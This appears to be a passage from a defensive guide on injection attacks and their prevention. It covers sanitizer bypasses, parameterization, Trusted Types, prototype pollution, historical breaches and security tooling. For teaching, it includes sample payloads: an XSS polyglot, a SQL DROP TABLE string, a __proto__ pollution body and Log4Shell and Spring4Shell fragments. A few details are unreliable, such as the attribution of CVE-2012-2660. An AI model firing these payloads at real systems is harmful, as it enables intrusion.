1. **Use a non-backtracking engine**: Hyperscan (Intel), RE2 (Google), Rust's `regex` crate. These engines guarantee linear time at the cost of some regex features (no backreferences).
2. **Set timeouts**: many engines support per-match timeout (Python's `regex` module, .NET's `Regex` constructor). A timeout caps the worst-case runtime.
3. **Avoid regex for simple validation**: `str.isdigit()`, `len(s) <= N`, schema validation libraries are often clearer and faster.
4. **Lint regex patterns**: tools like `safe-regex` (npm), `redos-detector` (Python) flag suspicious patterns.

Staticcheck (Go) has lint rules for some ReDoS-prone patterns. ESLint's `regexp/no-super-linear-backtracking` rule catches many cases in JavaScript.

## Why Naive Sanitizers Fail

Suppose a developer attempts to sanitize HTML by writing:

```python
def sanitize(s):
    return s.replace("<", "&lt;").replace(">", "&gt;")
```

This blocks the obvious `<script>alert(1)</script>` payload. Does it block all XSS?

No. Consider the payload `&lt;script&gt;alert(1)&lt;/script&gt;`. It contains no `<` or `>`. The sanitizer leaves it unchanged. If the resulting string is HTML-decoded later (perhaps because it goes through a "decode then render" path), the `&lt;` becomes `<` and the script tag reappears.

Multi-pass sanitization is a common error: an HTML decoder unrolls `&lt;`, `&#x3C;`, `&#60;`, `&LT;`, and many other forms back to `<`. If the sanitizer runs before the decoder, the decoded forms are unrolled to `<` after the sanitizer's chance to escape them. The page is vulnerable.

The general principle is **canonicalize first, then sanitize**. Or, equivalently, **sanitize the form that the parser will ultimately see**.

The same problem appears in path traversal (`../` vs `..%2F` vs `..%252F`), in URL parsing (multiple representations of the same host), and in Unicode normalization (NFC vs NFD vs NFKC vs NFKD — same characters, different byte sequences).

The fix is twofold:

1. **Canonicalize at the boundary**: decode percent-encoding, normalize Unicode, resolve relative paths, parse to a structured representation. Then validate.
2. **Use a real parser**, not regex. An HTML sanitizer should parse HTML to a DOM tree, walk the tree, and emit a sanitized DOM serialization. DOMPurify (JavaScript), Bleach (Python), sanitize (Ruby) all take this approach.

The principle generalizes: **wherever you see custom string manipulation defending against an injection, suspect a bypass via an alternate representation**.

## Defense Maturity Levels

Drawing the lessons together, we can describe a maturity ladder for injection defense.

**Level 0: No protection.** The application concatenates user input into queries, commands, templates, and HTML responses. Vulnerabilities are everywhere; an attacker with a basic toolkit finds them in minutes.

**Level 1: Deny-list filtering.** The application strips or rejects specific dangerous characters: quotes, semicolons, angle brackets. Common in PHP applications from the early 2000s. Bypassable by alternate encodings (`%27` for `'`), Unicode equivalents, and double-encoding tricks. Still in use because deny-lists feel like they're doing something, but they are not the principle defense.

**Level 2: Allow-list validation at the boundary.** The application validates input against expected forms: numeric, alphanumeric, email, URL, etc. Inputs that don't match the spec are rejected. Allow-lists are stronger than deny-lists because they fail closed: only explicitly-permitted inputs are accepted. But allow-lists alone don't prevent injection; a perfectly valid email address can still be SQL-injected if concatenated into a query.

**Level 3: Parameterization at every protocol boundary.** Every SQL query uses prepared statements. Every shell invocation uses argv arrays. Every HTML render uses auto-escaping templates. Every redirect URL is constructed via a typed builder. The protocol-level separation prevents value-as-code confusion. This is the level at which an application can be considered "injection-resistant" in the conventional sense.

**Level 4: Type-system enforcement.** Languages and frameworks use the type system to make injection impossible by construction. `sqlx` in Rust verifies SQL queries at compile time against a schema. `Trusted Types` in browsers refuse to assign arbitrary strings to `innerHTML`. F#'s units of measure prevent unit-mismatch bugs. Haskell's `Tainted` monad (in some libraries) tracks data provenance. At Level 4, an injection bug is a type error caught by the compiler — no runtime check needed.

Most production systems live at Level 2-3. Level 4 is achievable in greenfield projects with the right framework choices and discipline.

## Trusted Types (Browser)

Trusted Types is a browser feature (Chrome 83+, behind a flag in some other browsers as of writing). When enabled via CSP `require-trusted-types-for 'script'`, the browser refuses to execute strings passed to "dangerous sinks" — `innerHTML`, `eval`, `Function`, `setTimeout(string, ...)`, `setInterval(string, ...)`, `document.write`, etc. These sinks accept only `TrustedHTML`, `TrustedScript`, or `TrustedScriptURL` objects, which can only be created via a `TrustedTypePolicy`.

```javascript
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScriptURL: (url) => sanitizeURL(url),
});

element.innerHTML = policy.createHTML(userContent); // OK
element.innerHTML = userContent;                     // TypeError
```

The effect is to centralize sanitization. There is exactly one place in the codebase that produces `TrustedHTML` (the policy), and that place is auditable and testable. Every `innerHTML` assignment elsewhere either uses the policy or produces a runtime error. The "find every `innerHTML` in the codebase and fix it" project is replaced with "audit the policy."

Trusted Types is a Level-4 defense: the type system (in this case, the browser's runtime type checks) makes the wrong code impossible. Trusted Types alone won't cover every XSS surface — `eval`-equivalent constructs in third-party scripts can still execute, and the policy can have bugs — but it dramatically reduces the surface and makes auditing tractable.

Adoption is a multi-stage process: start in CSP `report-only` mode to identify offending sites, refactor them, then enforce. Google has been deploying Trusted Types across its products for years; the migration cost is real but achievable.

## The Boundary Principle

The defenses across all injection classes can be summarized in three words: **validate, parameterize, encode**.

- **Validate** at the **boundary** where untrusted input enters the system. Boundaries are HTTP request handlers, message-queue consumers, file readers. At the boundary, parse the input into a structured form, allow-list it against the spec, reject anything that doesn't match.

- **Parameterize** at every **protocol** crossing. Protocols are SQL, the kernel `execve`, HTTP outbound requests, LDAP, XPath, mail SMTP, etc. Each protocol has its own parameterization API; use it.

- **Encode** at every **sink** where the value is rendered into a context with its own grammar. Sinks are HTML templates, JSON serializers, log emitters, CSV writers. Each sink has context-aware encoding; use the framework's auto-escaper or wrap with explicit encoders.

The three layers are in sequence: validate first, parameterize when crossing protocols, encode when reaching sinks. Each layer catches the failures of the others.

The principle is general because injection is general: any time bytes from an untrusted source mix with code, in any layer of the stack, the same defense applies. The vocabulary (validate / parameterize / encode) has matured over twenty years of CVEs and is now the OWASP-canonical advice.

## Grammar Theory and Lexer Internals

To deepen the parser-confusion intuition, it helps to walk through how a real lexer works. Most production SQL lexers, whether in PostgreSQL, MySQL, SQLite, or DuckDB, are hand-written state machines. They are not based on lex/flex generators because hand-written code allows finer error messages and better integration with the surrounding parser. The state machine has a small fixed number of states, each corresponding to "what kind of token are we in the middle of recognizing."

A simplified state machine for SQL has the following states:

- **START**: between tokens, ready to begin a new token. Whitespace is skipped here. The next non-whitespace character determines the next state.
- **IDENTIFIER**: reading letters, digits, and underscores. Continues until a non-identifier character. The accumulated bytes are then looked up in the keyword table; matched entries become keyword tokens, unmatched entries become identifier tokens.
- **NUMBER**: reading digits. May transition to FLOAT on `.` or to EXPONENT on `e` or `E`. Terminates on non-digit, non-decimal-point character.
- **STRING**: reading characters between single quotes. Some dialects use `''` as an escaped quote within strings; others use `\'`. The state remains STRING until a closing quote is found. If the input ends in this state, the lexer reports an unterminated-string error.
- **COMMENT_LINE**: reading characters after `--` until newline.
- **COMMENT_BLOCK**: reading characters after `/*` until `*/`. Some dialects (Postgres) allow nesting; others do not.
- **OPERATOR**: reading multi-character operators like `<=`, `>=`, `!=`, `<>`. These are recognized greedily — the lexer prefers the longest match.

What does an attacker payload do to this state machine? Consider concatenating `'; DROP TABLE users; --` into a query like `SELECT * FROM users WHERE name = 'alice'`. The lexer enters STRING on the first `'`, reads `alice`, exits STRING on the closing `'`. Then in START, it sees `;`, emits `SEMI` token. Then in START, it sees `D`, transitions to IDENTIFIER, reads `DROP`. In keyword table, matched. Emits `DROP` keyword token. And so on. Every attacker byte transitions the state machine through legitimate states, producing tokens that subsequent parsing accepts as a valid statement.

There is no place in this design where the lexer can know that the bytes inside `'alice'` came from a different source than the bytes outside. The state machine has no provenance information. It only has the current state and the current byte. Provenance is an artifact of the higher-level API; the lexer is a closed-form transformation from a byte stream to a token stream.

This is exactly why the right defense is at the API layer above the lexer, not within the lexer. A SQL engine could, in principle, accept lexed tokens as input and skip the byte-level lexing. The prepared-statement protocol approximates this: the application sends a SQL string with placeholders, the engine lexes and parses once, and the values are bound after lexing has finished. The lexer is run on developer-authored bytes only.

Some research databases — for example, some embedded engines used in security-critical contexts — implement an even stronger form, where the application sends a serialized AST (not a string) over the wire. The engine never has a lexer at all in the hot path. This is the logical extreme of the protocol-level separation: the structure is the protocol; the values are bound to leaf nodes; the bytes never need re-parsing.

## Compile-Time Verification

A modern direction in injection defense is compile-time verification of queries. The Rust ecosystem's `sqlx` crate is the canonical example: at compile time, the macro `query!()` connects to a development database, prepares the statement, infers the types of bound parameters and result columns from the schema, and refuses to compile if the SQL is malformed or if the application's types disagree with the database's.

```rust
let user = sqlx::query!("SELECT id, email FROM users WHERE id = $1", user_id)
    .fetch_one(&pool)
    .await?;
```

If `users` does not exist, or `email` is misnamed, or `user_id` is not an integer, compilation fails. The application cannot ship code that would run a malformed query in production. And — critically for this discussion — the `query!` macro accepts only a string literal as its first argument. There is no way to construct the SQL dynamically and pass it to `query!`. The compile-time check requires a statically-known SQL string. This is by design: dynamic SQL forfeits the verification.

The same idea exists in:

- **PgTyped** (TypeScript): generates types from SQL files at build time.
- **PostgREST**: exposes the database schema as a REST API, so the API surface is the database schema itself; there is no place for dynamic SQL.
- **EdgeDB / Prisma**: schema-aware query builders that emit parameterized SQL.
- **F#'s SQLProvider**: type-providers for SQL Server / Postgres / MySQL.

Compile-time verification is Level 4 of the maturity ladder. It moves injection from a runtime concern to a build-time concern, where it can be caught by CI before deployment.

## Wire Protocol Forensics

When investigating a suspected SQL injection, network traces of the database protocol are illuminating. A Postgres prepared statement on the wire looks like:

```
> Parse statement="" query="SELECT id FROM users WHERE name = $1"
< ParseComplete
> Bind portal="" statement="" params=[("alice",)]
< BindComplete
> Execute portal="" maxrows=0
< RowDescription
< DataRow [42]
< CommandComplete
< ReadyForQuery
```

The `Parse` message contains only the SQL with `$1` placeholders. The `Bind` message contains the values. They are separate messages on the wire. A packet capture of normal application traffic should show this pattern.

A non-parameterized application's traffic looks instead like:

```
> Query "SELECT id FROM users WHERE name = 'alice'"
< RowDescription
< DataRow [42]
< CommandComplete
< ReadyForQuery
```

A single `Query` message containing the fully-formed SQL. No `Parse` / `Bind` / `Execute` separation. If user input is reaching this query, it is a string-concatenation vulnerability.

This pattern is observable in `tcpdump` captures with `-X` for hex output, in Postgres logs with `log_statement = 'all'`, in MySQL's general query log, in SQL Server's Extended Events. Auditing production traffic for the absence of `Parse`/`Bind` patterns on user-input-bearing endpoints is a useful supplementary control.

A subtle wrinkle: connection poolers like PgBouncer in transaction mode do not forward prepared statements between transactions. Some applications work around this by enabling "simple query" mode, where parameters are escaped client-side and concatenated into the SQL string. This silently downgrades the protocol-level safety to client-side escape safety. The client library is now responsible for escaping correctly across SQL versions, character sets, and edge cases. Several CVEs have stemmed from this downgrade in npm-postgres, sequelize, and other tools.

## Polyglot Payloads

Some injection payloads are deliberately constructed to work in multiple contexts simultaneously. A single string might be a valid SQL injection, a valid HTML/JS injection, and a valid LDAP filter, all at once. Polyglot payloads are useful to penetration testers because they reduce the number of probes needed to find a vulnerability — one payload tests several injection classes in one HTTP request.

A famous polyglot, attributed to security researcher Gareth Heyes, fits XSS, SQL injection, and template injection in one string:

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(42)//'>
```

The string is constructed so that:

- In an HTML body context, the `<svg/onload=...>` triggers JavaScript.
- In a `title`/`style`/`textarea`/`script`/`xmp` context, the closing tag escapes back to HTML body, then the `<svg>` triggers.
- In a JavaScript string context, the `*/` exits a multiline comment, the `'+` joins, the trailing structure runs an alert.
- In some templating contexts, embedded `{{}}` or similar expressions can be added.

Polyglots illustrate that a single sanitization pass is rarely enough. The payload is *valid* in every context it targets; it does not require the developer to forget anything. The defense is layered and context-specific: the framework's auto-escaper decides what each context needs.

A practical takeaway: penetration tests use payload lists like SecLists' "fuzzdb" and OWASP's wordlists. Logging WAF blocks of these well-known payloads is normal background noise, but a successful execution (a script running, a query returning rows it shouldn't, an error message containing application internals) is the signal.

## Mass Assignment as Injection

A neighboring class, sometimes filed separately, is **mass assignment** (or "object injection" in some literature). Frameworks that automatically map HTTP form data to model fields — Rails' ActiveRecord, Django's ModelForm, Java's Spring data binders — can be tricked into setting fields the developer did not intend.

```ruby
# Vulnerable
User.create(params[:user])
# params is { name: "alice", email: "a@b", role: "admin" }
# The role field is set even though the form never displayed it
```

The attacker discovers the field name via JavaScript inspection of the database schema, the framework's source, or trial and error, and submits the additional field. The framework, mapping `params[:user]` onto `User`'s columns, sets `role` to `admin`. The user is now an administrator.

Strictly, this is not injection of code — it is injection of *data* that flips a privilege check. But the structural shape is identical: untrusted bytes (form data) are concatenated with trusted code (database update logic) without a clear boundary between them. The fix has the same shape: parameterize the boundary by allow-listing fields.

Rails: `params.require(:user).permit(:name, :email)`. Django: `Meta.fields = ['name', 'email']` on the ModelForm. Spring: `@ModelAttribute` with explicit fields or `@DataBinder.setAllowedFields`.

The CVE-2012-2660 — GitHub's Rails mass-assignment bypass — is the canonical example, where a researcher used the same primitive to add an SSH key to the Rails repository owners and then committed to the project as a demonstration. The Rails community responded by changing the default to "deny mass assignment unless explicitly allowed" in subsequent versions.

## Prototype Pollution

JavaScript has a unique injection class called **prototype pollution**. Every JavaScript object has a `__proto__` property pointing to its prototype. If an attacker can set `__proto__.isAdmin = true` on any object, every object in the runtime that inherits from `Object.prototype` (which is most of them) suddenly has `isAdmin = true`.

The vulnerability appears in code that recursively merges user-supplied JSON onto an existing object:

```javascript
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

merge({}, JSON.parse(req.body));
// req.body = '{"__proto__": {"isAdmin": true}}'
// Now Object.prototype.isAdmin === true everywhere
```

The recursion follows the `__proto__` key into the global prototype, then sets `isAdmin` on it. Subsequent code that does `if (user.isAdmin)` returns true even if the user object has no such field, because it falls through to the prototype.

Prototype pollution has been found in lodash (`_.merge`, `_.set`, `_.zipObjectDeep`), jQuery (`$.extend(true, ...)`), Hoek, and many other utility libraries. Patches add either explicit checks for `__proto__` and `constructor` keys, or use `Object.create(null)` to create prototype-less target objects.

The defense for application code:

1. **Use Map instead of Object** for arbitrary-key data structures. `Map`s do not have prototype pollution surface.
2. **Use `Object.create(null)`** for objects intended as plain dictionaries. They have no prototype; setting `__proto__` on them creates a regular property, not a prototype mutation.
3. **Validate against a schema** before merging. Schemas with explicit fields reject `__proto__`, `constructor`, `prototype`.

Node.js 22+ runs with `--frozen-intrinsics` available as a flag, which freezes built-in prototypes against modification. This is a strong runtime defense but breaks some libraries that rely on modifying prototypes legitimately.

## Server-Side JavaScript and SSJI

Server-Side JavaScript Injection (SSJI) is the Node.js / Deno / Bun version of `eval`-based code injection. The payloads exploit the same primitives as Python `eval`/`exec`:

```javascript
const result = eval(userInput);  // RCE
const fn = new Function(userInput);  // RCE
const result = vm.runInThisContext(userInput);  // RCE
require(userInput);  // potential RCE if userInput is a path to a file with side effects
```

A `vm` module in Node provides `runInNewContext` and `runInContext`, which execute code in a separately-scoped V8 context. These are sometimes presented as sandboxes, but the V8 context boundary is not a security boundary. The Node documentation explicitly says: "The vm module is not a security mechanism. Do not use it to run untrusted code."

Workarounds use `isolated-vm` (a Node module wrapping V8 isolates), `safe-eval`, or microvms (Firecracker, gVisor). Each has caveats. Genuine sandboxing requires OS-level isolation: a separate process, a separate user, ideally a separate container with seccomp rules. Anything less is defense-in-depth at best.

## GraphQL Injection

GraphQL has its own injection surface. The query language itself is structured (no string concatenation in normal use), but several patterns introduce vulnerabilities:

- **Unbounded queries**: an attacker submits a deeply-nested query that fans out to thousands of database calls.
- **Aliasing for amplification**: GraphQL aliases (`field1: someExpensiveField, field2: someExpensiveField, ...`) cause the same expensive resolver to run many times in one request.
- **Introspection enumeration**: the `__schema` query returns the entire schema, helping the attacker map the API surface.
- **Directive injection**: custom directives that execute logic can be exploited if the directive accepts arbitrary parameters.
- **Resolver-internal SQL injection**: the GraphQL resolver function takes user input and constructs SQL with concatenation. The same anti-pattern as REST endpoints.

Defenses include query depth limiting (e.g., 10), query complexity scoring (assign cost to each field, cap total), persisted queries (the client sends a hash, the server looks up a pre-approved query), and disabling introspection in production.

## SQL Identifier Quoting Across Dialects

A loose end on identifier injection: SQL dialects differ in how identifiers are quoted. Postgres uses double quotes (`"users"`), MySQL uses backticks (`\`users\``) by default but supports double quotes in ANSI mode, SQL Server uses square brackets (`[users]`) or double quotes, Oracle uses double quotes, SQLite is permissive.

A "quote this identifier" function must therefore be dialect-aware:

```python
def quote_ident_postgres(s: str) -> str:
    return '"' + s.replace('"', '""') + '"'

def quote_ident_mysql(s: str) -> str:
    return '`' + s.replace('`', '``') + '`'
```

Most database drivers expose this function: psycopg2's `psycopg2.sql.Identifier`, asyncpg's `asyncpg.utils._quote_ident`, MySQL Connector's `connection.escape_string`. Use the driver's function rather than rolling your own. Even better, use a query builder (SQLAlchemy Core, Knex, jOOQ) that emits identifiers correctly across dialects.

The deeper point is that even "proper" identifier quoting is escaping, not parameterization. The identifier is interpolated into the SQL string. If the allow-list is wrong, an attacker can submit `name`; DROP TABLE x; --` as the column name, the quote function escapes the embedded quote (producing `"name`; DROP TABLE x; --"` in Postgres syntax), and the result is a single column reference with an unusual name — still injection-free. But the surface for mistakes is narrower than free-form value escaping; the allow-list pattern remains the safer approach.

## Historical Vulnerabilities: A Tour

A short tour of historically significant injection bugs makes the abstract concrete.

**Heartland Payment Systems (2008)**: a SQL injection in a payment processor's web application led to the theft of approximately 130 million credit card records. The attackers, led by Albert Gonzalez, used the SQL injection to install memory-scraping malware. This breach was a turning point for PCI-DSS enforcement and brought SQL injection into mainstream business risk awareness.

**Sony Pictures (2011)**: a SQL injection in `sonypictures.com` was used to extract email addresses, passwords, and home addresses for over a million users. The attackers (LulzSec) published the data publicly. The vulnerability was a textbook string-concatenated query in a contest sign-up endpoint.

**Drupal SA-CORE-2014-005 ("Drupalgeddon")**: a SQL injection in Drupal 7's database abstraction layer affected every Drupal site for several days. The bug was in the prepared-statement key-handling code itself: array keys with embedded `:` were used unfiltered in the query construction, allowing attackers to inject SQL through array indices. This is a particularly instructive bug because the code "looked parameterized" but the parameterization API itself had a bypass.

**Equifax (2017)**: an Apache Struts 2 OGNL injection (CVE-2017-5638) in the file-upload form allowed remote code execution. The vulnerability was an OGNL expression in the `Content-Type` header being evaluated by the Struts framework. Equifax failed to apply the patch in time. The breach exposed personal data of 147 million people.

**Capital One (2019)**: SSRF in a misconfigured ModSecurity WAF rule, combined with IMDSv1 on EC2, allowed an attacker to extract the IAM role credentials of the application server. The credentials granted S3 read access to customer data buckets. The breach affected 100 million customers and led to the IMDSv2 mandate.

**Log4Shell (2021, CVE-2021-44228)**: not strictly a classical injection class, but a templating-style flaw where Log4j evaluated `${jndi:ldap://...}` expressions inside log messages. Any log line containing user-controlled data was potentially an RCE vector. The fix was to disable JNDI lookups by default. The blast radius was enormous because Log4j is in nearly every Java application.

**Spring4Shell (2022, CVE-2022-22965)**: a class-pollution attack on Spring Framework's data binding, exploiting the `ClassLoader` accessible through nested property paths. By submitting a form with `class.module.classLoader.resources.context.parent.pipeline.first.pattern`, attackers could write arbitrary files into the server's classpath, leading to RCE. The class of bug — overly-flexible reflection in form binding — has surfaced repeatedly.

These are the headline bugs. Behind them are thousands of less-publicized CVEs in WordPress plugins, Drupal modules, Joomla components, Magento extensions, npm packages, PyPI packages, RubyGems, Maven artifacts. Every package ecosystem accumulates injection bugs at a steady rate; defensive tooling (Snyk, Dependabot, GitHub's vulnerability database) is now an essential part of supply-chain security.

## Threat Modeling for Injection

Threat modeling is one of the most cost-effective injection defenses available. A two-hour whiteboard session with the engineering team, walking through the data flow of a feature and asking "where could untrusted input reach a parser," routinely surfaces bugs that would otherwise ship to production. The cost is one afternoon; the savings are measured in incident-response hours, customer trust, and dollars not paid to attackers, lawyers, and regulators.

Threat modeling — STRIDE, LINDDUN, PASTA — places injection within the broader attacker-goal landscape. STRIDE's "T" (Tampering) and "I" (Information disclosure) categories capture most injection impacts. Threat modeling forces the question: at every trust boundary in the architecture, what data crosses, what can the attacker do with that data, and what is the worst case?

A typical threat-model finding for a web app:

- **Boundary**: HTTP request from public Internet to application server.
- **Data**: arbitrary form fields, headers, query parameters.
- **Threats**: SQL injection in search endpoint; XSS in reflected error messages; SSRF in image-fetch feature; XXE in XML upload handler; path traversal in file-download endpoint; command injection in image-conversion shell-out.
- **Mitigations**: parameterized queries, auto-escaping templates, allowlist of fetch destinations, defused XML parser, basename-only path joining, argv-form subprocess.
- **Residual risk**: novel polyglot payloads, unknown deserialization gadgets, zero-day in a third-party library.

The threat model is a living document; it should be revisited when architecture changes. Adding a new external service introduces new boundaries; adding a new file format introduces new parsers; adding a new authentication mechanism introduces new sinks. Each change is an opportunity to introduce a bug and an opportunity to verify the defenses are still complete.

A useful exercise: pair threat modeling with abuse-case stories. "An attacker submits a search term containing a quote and observes a database error." "An attacker submits an upload of a 1KB XML file that consumes 8GB of memory." "An attacker submits a redirect URL pointing to the cloud metadata IP." Walking through these scenarios in design review — before code is written — finds bugs that no scanner can detect, because the bugs are in the architecture, not in the implementation.

## Tooling and Automation

Defending against injection at scale requires automation. A few categories of tooling are worth knowing in detail.

**Static Application Security Testing (SAST)**: tools that analyze source code without running it. Semgrep, CodeQL, Snyk Code, Checkmarx, Fortify, Veracode all offer SAST. They look for patterns: a string concatenation followed by a database call; a value flowing from a request handler to `eval`; a template constructed from a user field. Pattern-based SAST catches the bulk of obvious bugs but misses anything that requires deep dataflow understanding. CodeQL, the GitHub-owned successor to Semmle, models the program as a relational dataset and lets users write queries in QL — a more expressive but slower approach.

**Dynamic Application Security Testing (DAST)**: tools that probe a running application with attack payloads. Burp Suite (Portswigger), OWASP ZAP, Acunetix, Detectify, Tenable.io. They submit payloads, observe responses, and flag suspicious behavior. DAST finds bugs SAST misses (logic bugs, configuration bugs) but misses bugs that require credentials or specific application state.

**Interactive Application Security Testing (IAST)**: an instrumented runtime that watches for dangerous data flows during execution. Contrast Security, Veracode IAST. The instrumented application reports when user input reaches a sink. IAST has the highest signal-to-noise ratio but requires runtime support and tends to be heavyweight.

**Fuzzing**: AFL++, libFuzzer, Jazzer (Java), cargo-fuzz (Rust), go-fuzz (Go). Fuzzers feed random or guided inputs to the application and watch for crashes, hangs, or oracle violations. Modern fuzzers use coverage feedback to evolve inputs that explore deeper code paths. Continuous fuzzing — OSS-Fuzz for open-source projects, ClusterFuzz internally at Google — has caught many injection bugs by reaching code paths that human testers don't think of.

**Runtime Application Self-Protection (RASP)**: a defensive instrumented runtime that blocks attacks in production. Sqreen, Imperva RASP, Contrast Protect. RASP catches what made it through SAST/DAST/IAST and provides a last line of defense, at the cost of latency overhead and operational complexity.

**Web Application Firewalls (WAF)**: Cloudflare WAF, AWS WAF, ModSecurity (open source), F5 Advanced WAF. WAFs sit in front of the application and apply rules to incoming requests. They are pattern-matchers; they catch known payloads but are bypassable with novel encodings, polymorphic payloads, or HTTP request smuggling. WAFs are a network-layer mitigation, not a substitute for code-level fixes.

The combination of SAST in CI, DAST in staging, IAST in QA, fuzzing for high-value parsers, and a WAF in production constitutes a mature defense pipeline. Few organizations run all five; most run one or two. The risk model dictates how much is justified.

## Layered Architecture: The Mental Model

A useful mental model for thinking about injection defense is the OSI model — but for trust boundaries rather than network layers. Each layer is responsible for a specific kind of safety; each layer relies on the layer below to deliver clean input.

**Layer 1: Transport**. TLS, mutual TLS, network-level authentication. Ensures that bytes arrive from where they claim to.

**Layer 2: Presentation**. Charset decoding, content-type interpretation. The bytes are interpreted as UTF-8 text, JSON, XML, etc. Mismatches at this layer produce subtle bugs (UTF-7 confusion in old IE, JSON parsing differences across libraries).

**Layer 3: Schema validation**. The decoded structure is checked against an expected schema. Required fields present, types correct, lengths bounded, enum values valid. JSON Schema, OpenAPI, Pydantic, Joi, Zod live here.

**Layer 4: Business validation**. Beyond schema, application-specific rules: this user has permission to update this resource, this product is in stock, this date is in the future. Authorization fits here.

**Layer 5: Persistence boundary**. Storage layer interactions: SQL queries, NoSQL operations, file writes. Parameterization lives here.

**Layer 6: External-call boundary**. Outbound calls to other services, HTTP fetches, shell invocations. Argv arrays, allowlisted URLs, structured RPC live here.

**Layer 7: Output**. Rendering responses, HTML, JSON, headers, logs. Context-aware encoding lives here.

Each layer has its own defensive controls; each layer trusts the previous to deliver well-formed input. Skipping a layer doesn't break the application — many applications skip several — but it shifts the responsibility onto the remaining layers, which is where bugs accumulate.

The deepest insight from this model is that injection defense is not a checklist; it is an architecture. The codebase that follows the architecture finds injection bugs at design review (a new endpoint that doesn't fit the pattern). The codebase that doesn't finds them in production.

## Why Pen-Tests Find Injection

Even mature codebases — codebases that have used parameterization for years, employ auto-escaping templates everywhere, run static analysis, and have had multiple security audits — still ship injection bugs. Why?

The answer is **completeness**. Parameterization in 99 places and string concatenation in one place is enough for an attacker. The attacker only needs to find that one place.

Penetration testers find these "100 prepared statements + 1 string-concat" cases routinely. Common patterns:

- A new feature was developed under time pressure and skipped the standard pattern. The developer copied an old example that used string concatenation.
- An ORM `text()` or `.raw()` call escaped from a unit test where the developer was prototyping.
- An admin-only feature, considered low-risk, used dynamic SQL — and an attacker found a privilege-escalation that gave them admin access.
- A migration script ran ad-hoc dynamic SQL and was deployed to production by mistake.
- A third-party library called by the application has its own SQL surface, and the library uses concatenation internally.

Static analysis tools (Semgrep, CodeQL, Snyk Code) catch many of these by scanning for the string-concat-then-execute pattern. They are not perfect — too-strict rules produce too many false positives, too-lenient rules miss bugs — but they are the most cost-effective tool against the "one missing parameterization" failure mode.

The deeper point is that defense-in-depth is essential because completeness is unattainable. No team writes perfect code. The validation layer catches some bugs that slip past parameterization. The encoding layer catches some bugs that slip past validation. CSP catches some bugs that slip past encoding. Each layer has a non-zero failure rate; multiplying small failure rates produces a system that very rarely fails entirely.

The lesson for designers is to invest in tooling and architecture that make the safe path the easy path. ORMs that don't have a string-concatenation API are stronger than ORMs that do. Frameworks that auto-escape by default are stronger than frameworks that require explicit escaping. Browsers that enforce Trusted Types are stronger than browsers that don't.

The lesson for developers is humility: even if you've never written a SQL injection bug, you eventually will. The defense is to write code in environments where the bug is hard to express, and to build review and tooling habits that catch the bug before it ships.

## References

1. OWASP Injection Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
2. OWASP Top 10 (2021) A03: Injection — https://owasp.org/Top10/A03_2021-Injection/
3. OWASP SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
4. OWASP Query Parameterization Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
5. OWASP OS Command Injection Defense Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
6. OWASP LDAP Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
7. OWASP XML External Entity Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
8. OWASP Server-Side Request Forgery Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
9. OWASP Deserialization Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
10. OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
11. OWASP Content Security Policy Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
12. RFC 3986 — Uniform Resource Identifier (URI): Generic Syntax — https://datatracker.ietf.org/doc/html/rfc3986
13. RFC 4514 — LDAP: String Representation of Distinguished Names — https://datatracker.ietf.org/doc/html/rfc4514
14. RFC 4515 — LDAP: String Representation of Search Filters — https://datatracker.ietf.org/doc/html/rfc4515
15. RFC 5322 — Internet Message Format — https://datatracker.ietf.org/doc/html/rfc5322
16. RFC 7230 — HTTP/1.1: Message Syntax and Routing (CRLF semantics) — https://datatracker.ietf.org/doc/html/rfc7230
17. PostgreSQL Frontend/Backend Protocol — Extended Query — https://www.postgresql.org/docs/current/protocol-flow.html#PROTOCOL-FLOW-EXT-QUERY
18. MySQL Client/Server Protocol — Prepared Statements — https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_com_stmt_prepare.html
19. Microsoft SQL Server — sp_executesql — https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-executesql-transact-sql
20. Oracle PL/SQL — EXECUTE IMMEDIATE — https://docs.oracle.com/en/database/oracle/oracle-database/19/lnpls/EXECUTE-IMMEDIATE-statement.html
21. Python pickle module — Security warning — https://docs.python.org/3/library/pickle.html
22. Python ast.literal_eval — https://docs.python.org/3/library/ast.html#ast.literal_eval
23. Java Object Serialization Filtering — https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html
24. CVE-2015-7501 — Apache Commons Collections InvokerTransformer RCE — https://nvd.nist.gov/vuln/detail/CVE-2015-7501
25. Microsoft .NET — BinaryFormatter security guide — https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide
26. Trusted Types W3C Specification — https://w3c.github.io/trusted-types/dist/spec/
27. Content Security Policy Level 3 — https://www.w3.org/TR/CSP3/
28. WHATWG URL Standard — https://url.spec.whatwg.org/
29. RE2 Regular Expression Engine — https://github.com/google/re2
30. Hyperscan high-performance regex matcher — https://www.hyperscan.io/
31. ysoserial — Java deserialization payload generator — https://github.com/frohoff/ysoserial
32. DOMPurify — HTML sanitizer — https://github.com/cure53/DOMPurify
33. defusedxml — Python XML defusing library — https://github.com/tiran/defusedxml
